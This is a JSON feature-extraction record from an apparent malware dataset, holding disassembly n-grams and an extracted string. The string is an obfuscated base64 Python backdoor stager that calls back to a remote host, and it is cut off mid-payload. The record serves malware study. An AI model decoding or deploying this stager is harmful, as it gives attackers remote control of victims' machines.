{
    "filepath": "/corpus/family_4/428de69318eda21cd6f45078c93d59bac10d0ab9c64c4548c80a9655024963eb",
    "fileinfo": {
        "labels": {
            "family": "family_4"
        },
        "md5": "8c918358e5a7902599187571dc515e96",
        "type": "ASCII text, with very long lines, with no line terminators"
    },
    "plugins": [
        {
            "plugin": "extractors.disassembly",
            "version": "0.1",
            "results": {
                "xor al, ;jae ;jae ;js ;movsxd rbp, dword [rax]": 1,
                "invalid;xor al, ;movsxd rbp, dword gs:[rdi + ];sub byte gs:[rbx + ], bh;cmp dh, byte [rbx + ]": 1,
                "jbe ;outsb dx, byte [rsi];push rcx;movsxd rax, dword [edi + ];push ": 1,
                "push rcx;movsxd rbp, dword [ebp + ];invalid;invalid;push rdi": 1,
                "pop rax;jbe ;outsb dx, byte [rsi];push rcx;push ": 1,
                "jbe ;outsb dx, byte [rsi];push rcx;push ;imul esp, dword [rcx + ], ": 1,
                "je ;cmp dword [r9 + ], r15d;push ;insb byte [rdi], dx;ja ": 1,
                "xor esp, dword [rax + rsi*2 + ];insd dword [rdi], dx;push rdx;jae ;cmp dword [r9 + ], ecx": 1,
                "push rbx;pop rdx;pop rax;xor dword [rdx + ], r11d;xor byte [rdx + ], r9b": 1
            }
        },
        {
            "plugin": "extractors.strings",
            "version": "0.1",
            "results": {
                "import base64,sys": 1,
                "exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('IyEvdXNyL2Jpbi9weXRob24KaW1wb3J0IGJpbmFzY2lpCmltcG9ydCBjb2RlCmltcG9ydCBvcwppbXBvcnQgcGxhdGZvcm0KaW1wb3J0IHJhbmRvbQppbXBvcnQgcmUKaW1wb3J0IHNlbGVjdAppbXBvcnQgc29ja2V0CmltcG9ydCBzdHJ1Y3QKaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHN5cwppbXBvcnQgdGhyZWFkaW5nCmltcG9ydCB0aW1lCmltcG9ydCB0cmFjZWJhY2sKCnRyeToKICAgIGltcG9ydCBjdHlwZXMKZXhjZXB0IEltcG9ydEVycm9yOgogICAgaGFzX3dpbmRsbCA9IEZhbHNlCmVsc2U6CiAgICBoYXNfd2luZGxsID0gaGFzYXR0cihjdHlwZXMsICd3aW5kbGwnKQoKdHJ5OgogICAgdXJsbGliX2ltcG9ydHMgPSBbJ1Byb3h5SGFuZGxlcicsICdSZXF1ZXN0JywgJ2J1aWxkX29wZW5lcicsICdpbnN0YWxsX29wZW5lcicsICd1cmxvcGVuJ10KICAgIGlmIHN5cy52ZXJzaW9uX2luZm9bMF0gPCAzOgogICAgICAgIHVybGxpYiA9IF9faW1wb3J0X18oJ3VybGxpYjInLCBmcm9tbGlzdD11cmxsaWJfaW1wb3J0cykKICAgIGVsc2U6CiAgICAgICAgdXJsbGliID0gX19pbXBvcnRfXygndXJsbGliLnJlcXVlc3QnLCBmcm9tbGlzdD11cmxsaWJfaW1wb3J0cykKZXhjZXB0IEltcG9ydEVycm9yOgogICAgaGFzX3VybGxpYiA9IEZhbHNlCmVsc2U6CiAgICBoYXNfdXJsbGliID0gVHJ1ZQoKaWYgc3lzLnZlcnNpb25faW5mb1swXSA8IDM6CiAgICBpc19zdHIgPSBsYW1iZGEgb2JqOiBpc3N1YmNsYXNzKG9iai5fX2NsYXNzX18sIHN0cikKICAgIGlzX2J5dGVzID0gbGFtYmRhIG9iajogaXNzdWJjbGFzcyhvYmouX19jbGFzc19fLCBzdHIpCiAgICBieXRlcyA9IGxhbWJkYSAqYXJnczogc3RyKCphcmdzWzoxXSkKICAgIE5VTExfQllURSA9ICdceDAwJwogICAgdW5pY29kZSA9IGxhbWJkYSB4OiAoeC5kZWNvZGUoJ1VURi04JykgaWYgaXNpbnN0YW5jZSh4LCBzdHIpIGVsc2UgeCkKZWxzZToKICAgIGlmIGlzaW5zdGFuY2UoX19idWlsdGluc19fLCBkaWN0KToKICAgICAgICBpc19zdHIgPSBsYW1iZGEgb2JqOiBpc3N1YmNsYXNzKG9iai5fX2NsYXNzX18sIF9fYnVpbHRpbnNfX1snc3RyJ10pCiAgICAgICAgc3RyID0gbGFtYmRhIHg6IF9fYnVpbHRpbnNfX1snc3RyJ10oeCwgKigoKSBpZiBpc2luc3RhbmNlKHgsIChmbG9hdCwgaW50KSkgZWxzZSAoJ1VURi04JywpKSkKICAgIGVsc2U6CiAgICAgICAgaXNfc3RyID0gbGFtYmRhIG9iajogaXNzdWJjbGFzcyhvYmouX19jbGFzc19fLCBfX2J1aWx0aW5zX18uc3RyKQogICAgICAgIHN0ciA9IGxhbWJkYSB4OiBfX2J1aWx0aW5zX18uc3RyKHgsICooKCkgaWYgaXNpbnN0YW5jZSh4LCAoZmxvYXQsIGludCkpIGVsc2UgKCdVVEYtOCcsKSkpCiAgICBpc19ieXRlcyA9IGxhbWJkYSBvYmo6IGlzc3ViY2xhc3Mob2JqLl9fY2xhc3NfXywgYnl0ZXMpCiAgICBOVUxMX0JZVEUgPSBieXRlcygnXHgwMCcsICdVVEYtOCcpCiAgICBsb25nID0gaW50CiAgICB1bmljb2RlID0gbGFtYmRhIHg6ICh4LmRlY29kZSgnVVRGLTgnKSBpZiBpc2luc3RhbmNlKHgsIGJ5dGVzKSBlbHNlIHgpCgojIHJlc2VlZCB0aGUgcmFuZG9tIGdlbmVyYXRvci4KcmFuZG9tLnNlZWQoKQoKIwojIENvbnN0YW50cwojCgojIHRoZXNlIHZhbHVlcyB3aWxsIGJlIHBhdGNoZWQsIERPIE5PVCBDSEFOR0UgVEhFTQpERUJVR0dJTkcgPSBGYWxzZQpUUllfVE9fRk9SSyA9IFRydWUKSFRUUF9DT05ORUNUSU9OX1VSTCA9ICdodHRwczovLzE5Mi4xNjguMTQzLjE4OjQ0My9YQWFxRHJ1b3lRQWZyQXE0UXhINHF3aXl2VUtuc251TlNwcGpyTnhldnk5NDlXa2R6aUpQMFV1WERSLycKSFRUUF9QUk9YWSA9IE5vbmUKSFRUUF9VU0VSX0FHRU5UID0gJ01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgVHJpZGVudC83LjA7IHJ2OjExLjApIGxpa2UgR2Vja28nCkhUVFBfQ09PS0lFID0gTm9uZQpIVFRQX0hPU1QgPSBOb25lCkhUVFBfUkVGRVJFUiA9IE5vbmUKUEFZTE9BRF9VVUlEID0gJzU5M2NmMjg0NDJmMWUxNzM5NWE1ODBiMWM5MTg3MmEyJwpTRVNTSU9OX0dVSUQgPSAnMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAnClNFU1NJT05fQ09NTVVOSUNBVElPTl9USU1FT1VUID0gMzAwClNFU1NJT05fRVhQSVJBVElPTl9USU1FT1VUID0gNjA0ODAwClNFU1NJT05fUkVUUllfVE9UQUwgPSAzNjAwClNFU1NJT05fUkVUUllfV0FJVCA9IDEwCgpQQUNLRVRfVFlQRV9SRVFVRVNUICAgICAgICA9IDAKUEFDS0VUX1RZUEVfUkVTUE9OU0UgICAgICAgPSAxClBBQ0tFVF9UWVBFX1BMQUlOX1JFUVVFU1QgID0gMTAKUEFDS0VUX1RZUEVfUExBSU5fUkVTUE9OU0UgPSAxMQoKRVJST1JfU1VDQ0VTUyA9IDAKIyBub3QgZGVmaW5lZCBpbiBvcmlnaW5hbCBDIGltcGxlbWVudGF0aW9uCkVSUk9SX0ZBSUxVUkUgPSAxCkVSUk9SX0ZBSUxVUkVfUFlUSE9OID0gMgpFUlJPUl9GQUlMVVJFX1dJTkRPV1MgPSAzCgpDSEFOTkVMX0NMQVNTX0JVRkZFUkVEID0gMApDSEFOTkVMX0NMQVNTX1NUUkVBTSAgID0gMQpDSEFOTkVMX0NMQVNTX0RBVEFHUkFNID0gMgpDSEFOTkVMX0NMQVNTX1BPT0wgICAgID0gMwoKIwojIFRMViBNZXRhIFR5cGVzCiMKVExWX01FVEFfVFlQRV9OT05FICAgICAgID0gKCAgIDAgICApClRMVl9NRVRBX1RZUEVfU1RSSU5HICAgICA9ICgxIDw8IDE2KQpUTFZfTUVUQV9UWVBFX1VJTlQgICAgICAgPSAoMSA8PCAxNykKVExWX01FVEFfVFlQRV9SQVcgICAgICAgID0gKDEgPDwgMTgpClRMVl9NRVRBX1RZUEVfQk9PTCAgICAgICA9ICgxIDw8IDE5KQpUTFZfTUVUQV9UWVBFX1FXT1JEICAgICAgPSAoMSA8PCAyMCkKVExWX01FVEFfVFlQRV9DT01QUkVTU0VEID0gKDEgPDwgMjkpClRMVl9NRVRBX1RZUEVfR1JPVVAgICAgICA9ICgxIDw8IDMwKQpUTFZfTUVUQV9UWVBFX0NPTVBMRVggICAgPSAoMSA8PCAzMSkKIyBub3QgZGVmaW5lZCBpbiBvcmlnaW5hbApUTFZfTUVUQV9UWVBFX01BU0sgPSAoMTw8MzEpKygxPDwzMCkrKDE8PDI5KSsoMTw8MTkpKygxPDwxOCkrKDE8PDE3KSsoMTw8MTYpCgojCiMgVExWIGJhc2Ugc3RhcnRpbmcgcG9pbnRzCiMKVExWX1JFU0VSVkVEICAgPSAwClRMVl9FWFRFTlNJT05TID0gMjAwMDAKVExWX1VTRVIgICAgICAgPSA0MDAwMApUTFZfVEVNUCAgICAgICA9IDYwMDAwCgojCiMgVExWIFNwZWNpZmljIFR5cGVzCiMKVExWX1RZUEVfQU5ZICAgICAgICAgICAgICAgICAgID0gVExWX01FVEFfVFlQRV9OT05FICAgIHwgMApUTFZfVFlQRV9NRVRIT0QgICAgICAgICAgICAgICAgPSBUTFZfTUVUQV9UWVBFX1NUUklORyAgfCAxClRMVl9UWVBFX1JFUVVFU1RfSUQgICAgICAgICAgICA9IFRMVl9NRVRBX1RZUEVfU1RSSU5HICB8IDIKVExWX1RZUEVfRVhDRVBUSU9OICAgICAgICAgICAgID0gVExWX01FVEFfVFlQRV9HUk9VUCAgIHwgMwpUTFZfVFlQRV9SRVNVTFQgICAgICAgICAgICAgICAgPSBUTFZfTUVUQV9UWVBFX1VJTlQgICAgfCA0CgpUTFZfVFlQRV9TVFJJTkcgICAgICAgICAgICAgICAgPSBUTFZfTUVUQV9UWVBFX1NUUklORyAgfCAxMApUTFZfVFlQRV9VSU5UICAgICAgICAgICAgICAgICAgPSBUTFZfTUVUQV9UWVBFX1VJTlQgICAgfCAxMQpUTFZfVFlQRV9CT09MICAgICAgICAgICAgICAgICAgPSBUTFZfTUVUQV9UWVBFX0JPT0wgICAgfCAxMgoKVExWX1RZUEVfTEVOR1RIICAgICAgICAgICAgICAgID0gVExWX01FVEFfVFlQRV9VSU5UICAgIHwgMjUKVExWX1RZUEVfREFUQSAgICAgICAgICAgICAgICAgID0gVExWX01FVEFfVFlQRV9SQVcgICAgIHwgMjYKVExWX1RZUEVfRkxBR1MgICAgICAgICAgICAgICAgID0gVExWX01FVEFfVFlQRV9VSU5UICAgIHwgMjcKClRMVl9UWVBFX0NIQU5ORUxfSUQgICAgICAgICAgICA9IFRMVl9NRVRBX1RZUEVfVUlOVCAgICB8IDUwClRMVl9UWVBFX0NIQU5ORUxfVFlQRSAgICAgICAgICA9IFRMVl9NRVRBX1RZUEVfU1RSSU5HICB8IDUxClRMVl9UWVBFX0NIQU5ORUxfREFUQSAgICAgICAgICA9IFRMVl9NRVRBX1RZUEVfUkFXICAgICB8IDUyClRMVl9UWVBFX0NIQU5ORUxfREFUQV9HUk9VUCAgICA9IFRMVl9NRVRBX1RZUEVfR1JPVVAgICB8IDUzClRMVl9UWVBFX0NIQU5ORUxfQ0xBU1MgICAgICAgICA9IFRMVl9NRVRBX1RZUEVfVUlOVCAgICB8IDU0ClRMVl9UWVBFX0NIQU5ORUxfUEFSRU5USUQgICAgICA9IFRMVl9NRVRBX1RZUEVfVUlOVCAgICB8IDU1CgpUTFZfVFlQRV9TRUVLX1dIRU5DRSAgICAgICAgICAgPSBUTFZfTUVUQV9UWVBFX1VJTlQgICAgfCA3MApUTFZfVFlQRV9TRUVLX09GRlNFVCAgICAgICAgICAgPSBUTFZfTUVUQV9UWVBFX1VJTlQgICAgfCA3MQpUTFZfVFlQRV9TRUVLX1BPUyAgICAgICAgICAgICAgPSBUTFZfTUVUQV9UWVBFX1VJTlQgICAgfCA3MgoKVExWX1RZUEVfRVhDRVBUSU9OX0NPREUgICAgICAgID0gVExWX01FVEFfVFlQRV9VSU5UICAgIHwgMzAwClRMVl9UWVBFX0VYQ0VQVElPTl9TVFJJTkcgICAgICA9IFRMVl9NRVRBX1RZUEVfU1RSSU5HICB8IDMwMQoKVExWX1RZUEVfTElCUkFSWV9QQVRIICAgICAgICAgID0gVExWX01FVEFfVFlQRV9TVFJJTkcgIHwgNDAwClRMVl9UWVBFX1RBUkdFVF9QQVRIICAgICAgICAgICA9IFRMVl9NRVRBX1RZUEVfU1RSSU5HICB8IDQwMQoKVExWX1RZUEVfVFJBTlNfVFlQRSAgICAgICAgICAgID0gVExWX01FVEFfVFlQRV9VSU5UICAgIHwgNDMwClRMVl9UWVBFX1RSQU5TX1VSTCAgICAgICAgICAgICA9IFRMVl9NRVRBX1RZUEVfU1RSSU5HICB8IDQzMQpUTFZfVFlQRV9UUkFOU19VQSAgICAgICAgICAgICAgPSBUTFZfTUVUQV9UWVBFX1NUUklORyAgfCA0MzIKVExWX1RZUEVfVFJBTlNfQ09NTV9USU1FT1VUICAgID0gVExWX01FVEFfVFlQRV9VSU5UICAgIHwgNDMzClRMVl9UWVBFX1RSQU5TX1NFU1NJT05fRVhQICAgICA9IFRMVl9NRVRBX1RZUEVfVUlOVCAgICB8IDQzNApUTFZfVFlQRV9UUkFOU19DRVJUX0hBU0ggICAgICAgPSBUTFZfTUVUQV9UWVBFX1JBVyAgICAgfCA0MzUKVExWX1RZUEVfVFJBTlNfUFJPWFlfSE9TVCAgICAgID0gVExWX01FVEFfVFlQRV9TVFJJTkcgIHwgNDM2ClRMVl9UWVBFX1RSQU5TX1BST1hZX1VTRVIgICAgICA9IFRMVl9NRVRBX1RZUEVfU1RSSU5HICB8IDQzNwpUTFZfVFlQRV9UUkFOU19QUk9YWV9QQVNTICAgICAgPSBUTFZfTUVUQV9UWVBFX1NUUklORyAgfCA0MzgKVExWX1RZUEVfVFJBTlNfUkVUUllfVE9UQUwgICAgID0gVExWX01FVEFfVFlQRV9VSU5UICAgIHwgNDM5ClRMVl9UWVBFX1RSQU5TX1JFVFJZX1dBSVQgICAgICA9IFRMVl9NRVRBX1RZUEVfVUlOVCAgICB8IDQ0MApUTFZfVFlQRV9UUkFOU19IRUFERVJTICAgICAgICAgPSBUTFZfTUVUQV9UWVBFX1NUUklORyAgfCA0NDEKVExWX1RZUEVfVFJBTlNfR1JPVVAgICAgICAgICAgID0gVExWX01FVEFfVFlQRV9HUk9VUCAgIHwgNDQyCgpUTFZfVFlQRV9NQUNISU5FX0lEICAgICAgICAgICAgPSBUTFZfTUVUQV9UWVBFX1NUUklORyAgfCA0NjAKVExWX1RZUEVfVVVJRCAgICAgICAgICAgICAgICAgID0gVExWX01FVEFfVFlQRV9SQVcgICAgIHwgNDYxClRMVl9UWVBFX1NFU1NJT05fR1VJRCAgICAgICAgICA9IFRMVl9NRVRBX1RZUEVfUkFXICAgICB8IDQ2MgoKVExWX1RZUEVfUEVFUl9IT1NUICAgICAgICAgICAgID0gVExWX01FVEFfVFlQRV9TVFJJTkcgIHwgMTUwMApUTFZfVFlQRV9QRUVSX1BPUlQgICAgICAgICAgICAgPSBUTFZfTUVUQV9UWVBFX1VJTlQgICAgfCAxNTAxClRMVl9UWVBFX0xPQ0FMX0hPU1QgICAgICAgICAgICA9IFRMVl9NRVRBX1RZUEVfU1RSSU5HICB8IDE1MDIKVExWX1RZUEVfTE9DQUxfUE9SVCAgICAgICAgICAgID0gVExWX01FVEFfVFlQRV9VSU5UICAgIHwgMTUwMwoKRVhQT1JURURfU1lNQk9MUyA9IHt9CkVYUE9SVEVEX1NZTUJPTFNbJ0RFQlVHR0lORyddID0gREVCVUdHSU5HCgojIFBhY2tldCBoZWFkZXIgc2l6ZXMKRU5DX05PTkUgPSAwClBBQ0tFVF9YT1JfS0VZX1NJWkUgPSA0ClBBQ0tFVF9TRVNTSU9OX0dVSURfU0laRSA9IDE2ClBBQ0tFVF9FTkNSWVBUX0ZMQUdfU0laRSA9IDQKUEFDS0VUX0xFTkdUSF9TSVpFID0gNApQQUNLRVRfVFlQRV9TSVpFID0gNApQQUNLRVRfTEVOR1RIX09GRiA9IChQQUNLRVRfWE9SX0tFWV9TSVpFICsgUEFDS0VUX1NFU1NJT05fR1VJRF9TSVpFICsKICAgICAgICBQQUNLRVRfRU5DUllQVF9GTEFHX1NJWkUpClBBQ0tFVF9IRUFERVJfU0laRSA9IChQQUNLRVRfWE9SX0tFWV9TSVpFICsgUEFDS0VUX1NFU1NJT05fR1VJRF9TSVpFICsKICAgICAgICBQQUNLRVRfRU5DUllQVF9GTEFHX1NJWkUgKyBQQUNLRVRfTEVOR1RIX1NJWkUgKyBQQUNLRVRfVFlQRV9TSVpFKQoKY2xhc3MgU1lTVEVNX0lORk8oY3R5cGVzLlN0cnVjdHVyZSk6CiAgICBfZmllbGRzXyA9IFsoIndQcm9jZXNzb3JBcmNoaXRlY3R1cmUiLCBjdHlwZXMuY191aW50MTYpLAogICAgICAgICgid1Jlc2VydmVkIiwgY3R5cGVzLmNfdWludDE2KSwKICAgICAgICAoImR3UGFnZVNpemUiLCBjdHlwZXMuY191aW50MzIpLAogICAgICAgICgibHBNaW5pbXVtQXBwbGljYXRpb25BZGRyZXNzIiwgY3R5cGVzLmNfdm9pZF9wKSwKICAgICAgICAoImxwTWF4aW11bUFwcGxpY2F0aW9uQWRkcmVzcyIsIGN0eXBlcy5jX3ZvaWRfcCksCiAgICAgICAgKCJkd0FjdGl2ZVByb2Nlc3Nvck1hc2siLCBjdHlwZXMuY191aW50MzIpLAogICAgICAgICgiZHdOdW1iZXJPZlByb2Nlc3NvcnMiLCBjdHlwZXMuY191aW50MzIpLAogICAgICAgICgiZHdQcm9jZXNzb3JUeXBlIiwgY3R5cGVzLmNfdWludDMyKSwKICAgICAgICAoImR3QWxsb2NhdGlvbkdyYW51bGFyaXR5IiwgY3R5cGVzLmNfdWludDMyKSwKICAgICAgICAoIndQcm9jZXNzb3JMZXZlbCIsIGN0eXBlcy5jX3VpbnQxNiksCiAgICAgICAgKCJ3UHJvY2Vzc29yUmV2aXNpb24iLCBjdHlwZXMuY191aW50MTYpXQoKZGVmIHJhbmRfeG9yX2tleSgpOgogICAgcmV0dXJuIHR1cGxlKHJhbmRvbS5yYW5kaW50KDEsIDI1NSkgZm9yIF8gaW4gcmFuZ2UoNCkpCgpkZWYgeG9yX2J5dGVzKGtleSwgZGF0YSk6CiAgICBpZiBzeXMudmVyc2lvbl9pbmZvWzBdIDwgMzoKICAgICAgICBkZXhvcmVkID0gJycuam9pbihjaHIob3JkKGRhdGFbaV0pIF4ga2V5W2kgJSBsZW4oa2V5KV0pIGZvciBpIGluIHJhbmdlKGxlbihkYXRhKSkpCiAgICBlbHNlOgogICAgICAgIGRleG9yZWQgPSBieXRlcyhkYXRhW2ldIF4ga2V5W2kgJSBsZW4oa2V5KV0gZm9yIGkgaW4gcmFuZ2UobGVuKGRhdGEpKSkKICAgIHJldHVybiBkZXhvcmVkCgpkZWYgZXhwb3J0KHN5bWJvbCk6CiAgICBFWFBPUlRFRF9TWU1CT0xTW3N5bWJvbC5fX25hbWVfX10gPSBzeW1ib2wKICAgIHJldHVybiBzeW1ib2wKCmRlZiBnZW5lcmF0ZV9yZXF1ZXN0X2lkKCk6CiAgICBjaGFycyA9ICdhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5eicKICAgIHJldHVybiAnJy5qb2luKHJhbmRvbS5jaG9pY2UoY2hhcnMpIGZvciB4IGluIHJhbmdlKDMyKSkKCkBleHBvcnQKZGVmIGNyYzE2KGRhdGEpOgogICAgcG9seSA9IDB4MTAyMQogICAgcmVnID0gMHgwMDAwCiAgICBpZiBpc19zdHIoZGF0YSk6CiAgICAgICAgZGF0YSA9IGxpc3QobWFwKG9yZCwgZGF0YSkpCiAgICBlbGlmIGlzX2J5dGVzKGRhdGEpOgogICAgICAgIGRhdGEgPSBsaXN0KGRhdGEpCiAgICBkYXRhLmFwcGVuZCgwKQogICAgZGF0YS5hcHBlbmQoMCkKICAgIGZvciBieXRlIGluIGRhdGE6CiAgICAgICAgbWFzayA9IDB4ODAKICAgICAgICB3aGlsZSBtYXNrID4gMDoKICAgICAgICAgICAgcmVnIDw8PSAxCiAgICAgICAgICAgIGlmIGJ5dGUgJiBtYXNrOgogICAgICAgICAgICAgICAgcmVnICs9IDEKICAgICAgICAgICAgbWFzayA+Pj0gMQogICAgICAgICAgICBpZiByZWcgPiAweGZmZmY6CiAgICAgICAgICAgICAgICByZWcgJj0gMHhmZmZmCiAgICAgICAgICAgICAgICByZWcgXj0gcG9seQogICAgcmV0dXJuIHJlZwoKQGV4cG9ydApkZWYgZGVidWdfcHJpbnQobXNnKToKICAgIGlmIERFQlVHR0lORzoKICAgICAgICBwcmludChtc2cpCgpAZXhwb3J0CmRlZiBkZWJ1Z190cmFjZWJhY2sobXNnPU5vbmUpOgogICAgaWYgREVCVUdHSU5HOgogICAgICAgIGlmIG1zZzoKICAgICAgICAgICAgcHJpbnQobXNnKQogICAgICAgIHRyYWNlYmFjay5wcmludF9leGMoZmlsZT1zeXMuc3RkZXJyKQoKQGV4cG9ydApkZWYgZXJyb3JfcmVzdWx0KGV4Y2VwdGlvbj1Ob25lKToKICAgIGlmIG5vdCBleGNlcHRpb246CiAgICAgICAgXywgZXhjZXB0aW9uLCBfID0gc3lzLmV4Y19pbmZvKCkKICAgIGV4Y2VwdGlvbl9jcmMgPSBjcmMxNihleGNlcHRpb24uX19jbGFzc19fLl9fbmFtZV9fKQogICAgaWYgZXhjZXB0aW9uX2NyYyA9PSAweDRjYjI6ICMgV2luZG93c0Vycm9yCiAgICAgICAgcmV0dXJuIGVycm9yX3Jlc3VsdF93aW5kb3dzKGV4Y2VwdGlvbi5lcnJubykKICAgIGVsc2U6CiAgICAgICAgcmVzdWx0ID0gKChleGNlcHRpb25fY3JjIDw8IDE2KSB8IEVSUk9SX0ZBSUxVUkVfUFlUSE9OKQogICAgcmV0dXJuIHJlc3VsdAoKQGV4cG9ydApkZWYgZXJyb3JfcmVzdWx0X3dpbmRvd3MoZXJyb3JfbnVtYmVyPU5vbmUpOgogICAgaWYgbm90IGhhc193aW5kbGw6CiAgICAgICAgcmV0dXJuIEVSUk9SX0ZBSUxVUkUKICAgIGlmIGVycm9yX251bWJlciA9PSBOb25lOgogICAgICAgIGVycm9yX251bWJlciA9IGN0eXBlcy53aW5kbGwua2VybmVsMzIuR2V0TGFzdEVycm9yKCkKICAgIGlmIGVycm9yX251bWJlciA+IDB4ZmZmZjoKICAgICAgICByZXR1cm4gRVJST1JfRkFJTFVSRQogICAgcmVzdWx0ID0gKChlcnJvcl9udW1iZXIgPDwgMTYpIHwgRVJST1JfRkFJTFVSRV9XSU5ET1dTKQogICAgcmV0dXJuIHJlc3VsdAoKQGV4cG9ydApkZWYgZ2V0X2hkZF9sYWJlbCgpOgogICAgZm9yIF8sIF8sIGZpbGVzIGluIG9zLndhbGsoJy9kZXYvZGlzay9ieS1pZC8nKToKICAgICAgICBmb3IgZiBpbiBmaWxlczoKICAgICAgICAgICAgZm9yIHAgaW4gWydhdGEtJywgJ21iLSddOgogICAgICAgICAgICAgICAgaWYgZls6bGVuKHApXSA9PSBwOgogICAgICAgICAgICAgICAgICAgIHJldHVybiBmW2xlbihwKTpdCiAgICByZXR1cm4gJycKCkBleHBvcnQKZGVmIGdldF9uYXRpdmVfYXJjaCgpOgogICAgYXJjaCA9IGdldF9zeXN0ZW1fYXJjaCgpCiAgICBpZiBhcmNoID09ICd4NjQnIGFuZCBjdHlwZXMuc2l6ZW9mKGN0eXBlcy5jX3ZvaWRfcCkgPT0gNDoKICAgICAgICBhcmNoID0gJ3g4NicKICAgIHJldHVybiBhcmNoCgpAZXhwb3J0CmRlZiBnZXRfc3lzdGVtX2FyY2goKToKICAgIHVuYW1lX2luZm8gPSBwbGF0Zm9ybS51bmFtZSgpCiAgICBhcmNoID0gdW5hbWVfaW5mb1s0XQogICAgaWYgaGFzX3dpbmRsbDoKICAgICAgICBzeXNpbmZvID0gU1lTVEVNX0lORk8oKQogICAgICAgIGN0eXBlcy53aW5kbGwua2VybmVsMzIuR2V0TmF0aXZlU3lzdGVtSW5mbyhjdHlwZXMuYnlyZWYoc3lzaW5mbykpCiAgICAgICAgdmFsdWVzID0gezA6J3g4NicsIDU6J2FybWxlJywgNjonSUE2NCcsIDk6J3g2NCd9CiAgICAgICAgYXJjaCA9IHZhbHVlcy5nZXQoc3lzaW5mby53UHJvY2Vzc29yQXJjaGl0ZWN0dXJlLCB1bmFtZV9pbmZvWzRdKQogICAgaWYgYXJjaCA9PSAneDg2XzY0JzoKICAgICAgICBhcmNoID0gJ3g2NCcKICAgIHJldHVybiBhcmNoCgpAZXhwb3J0CmRlZiBpbmV0X3B0b24oZmFtaWx5LCBhZGRyZXNzKToKICAgIGlmIGZhbWlseSA9PSBzb2NrZXQuQUZfSU5FVDYgYW5kICclJyBpbiBhZGRyZXNzOgogICAgICAgIGFkZHJlc3MgPSBhZGRyZXNzLnNwbGl0KCclJywgMSlbMF0KICAgIGlmIGhhc2F0dHIoc29ja2V0LCAnaW5ldF9wdG9uJyk6CiAgICAgICAgcmV0dXJuIHNvY2tldC5pbmV0X3B0b24oZmFtaWx5LCBhZGRyZXNzKQogICAgZWxpZiBoYXNfd2luZGxsOgogICAgICAgIFdTQVN0cmluZ1RvQWRkcmVzcyA9IGN0eXBlcy53aW5kbGwud3MyXzMyLldTQVN0cmluZ1RvQWRkcmVzc0EKICAgICAgICBscEFkZHJlc3MgPSAoY3R5cGVzLmNfdWJ5dGUgKiAyOCkoKQogICAgICAgIGxwQWRkcmVzc0xlbmd0aCA9IGN0eXBlcy5jX2ludChjdHlwZXMuc2l6ZW9mKGxwQWRkcmVzcykpCiAgICAgICAgaWYgV1NBU3RyaW5nVG9BZGRyZXNzKGFkZHJlc3MsIGZhbWlseSwgTm9uZSwgY3R5cGVzLmJ5cmVmKGxwQWRkcmVzcyksIGN0eXBlcy5ieXJlZihscEFkZHJlc3NMZW5ndGgpKSAhPSAwOgogICAgICAgICAgICByYWlzZSBFeGNlcHRpb24oJ1dTQVN0cmluZ1RvQWRkcmVzcyBmYWlsZWQnKQogICAgICAgIGlmIGZhbWlseSA9PSBzb2NrZXQuQUZfSU5FVDoKICAgICAgICAgICAgcmV0dXJuICcnLmpvaW4obWFwKGNociwgbHBBZGRyZXNzWzQ6OF0pKQogICAgICAgIGVsaWYgZmFtaWx5ID09IHNvY2tldC5BRl9JTkVUNjoKICAgICAgICAgICAgcmV0dXJuICcnLmpvaW4obWFwKGNociwgbHBBZGRyZXNzWzg6MjRdKSkKICAgIHJhaXNlIEV4Y2VwdGlvbignbm8gc3VpdGFibGUgaW5ldF9wdG9uIGZ1bmN0aW9uYWxpdHkgaXMgYXZhaWxhYmxlJykKCkBleHBvcnQKZGVmIHBhY2tldF9lbnVtX3RsdnMocGt0LCB0bHZfdHlwZT1Ob25lKToKICAgIG9mZnNldCA9IDAKICAgIHdoaWxlIG9mZnNldCA8IGxlbihwa3QpOgogICAgICAgIHRsdiA9IHN0cnVjdC51bnBhY2soJz5JSScsIHBrdFtvZmZzZXQ6b2Zmc2V0ICsgOF0pCiAgICAgICAgaWYgdGx2X3R5cGUgaXMgTm9uZSBvciAodGx2WzFdICYgflRMVl9NRVRBX1RZUEVfQ09NUFJFU1NFRCkgPT0gdGx2X3R5cGU6CiAgICAgICAgICAgIHZhbCA9IHBrdFtvZmZzZXQgKyA4OihvZmZzZXQgKyA4ICsgKHRsdlswXSAtIDgpKV0KICAgICAgICAgICAgaWYgKHRsdlsxXSAmIFRMVl9NRVRBX1RZUEVfU1RSSU5HKSA9PSBUTFZfTUVUQV9UWVBFX1NUUklORzoKICAgICAgICAgICAgICAgIHZhbCA9IHN0cih2YWwuc3BsaXQoTlVMTF9CWVRFLCAxKVswXSkKICAgICAgICAgICAgZWxpZiAodGx2WzFdICYgVExWX01FVEFfVFlQRV9VSU5UKSA9PSBUTFZfTUVUQV9UWVBFX1VJTlQ6CiAgICAgICAgICAgICAgICB2YWwgPSBzdHJ1Y3QudW5wYWNrKCc+SScsIHZhbClbMF0KICAgICAgICAgICAgZWxpZiAodGx2WzFdICYgVExWX01FVEFfVFlQRV9RV09SRCkgPT0gVExWX01FVEFfVFlQRV9RV09SRDoKICAgICAgICAgICAgICAgIHZhbCA9IHN0cnVjdC51bnBhY2soJz5RJywgdmFsKVswXQogICAgICAgICAgICBlbGlmICh0bHZbMV0gJiBUTFZfTUVUQV9UWVBFX0JPT0wpID09IFRMVl9NRVRBX1RZUEVfQk9PTDoKICAgICAgICAgICAgICAgIHZhbCA9IGJvb2woc3RydWN0LnVucGFjaygnYicsIHZhbClbMF0pCiAgICAgICAgICAgIGVsaWYgKHRsdlsxXSAmIFRMVl9NRVRBX1RZUEVfUkFXKSA9PSBUTFZfTUVUQV9UWVBFX1JBVzoKICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgeWllbGQgeyd0eXBlJzogdGx2WzFdLCAnbGVuZ3RoJzogdGx2WzBdLCAndmFsdWUnOiB2YWx9CiAgICAgICAgb2Zmc2V0ICs9IHRsdlswXQogICAgcmFpc2UgU3RvcEl0ZXJhdGlvbigpCgpAZXhwb3J0CmRlZiBwYWNrZXRfZ2V0X3Rsdihwa3QsIHRsdl90eXBlKToKICAgIHRyeToKICAgICAgICB0bHYgPSBsaXN0KHBhY2tldF9lbn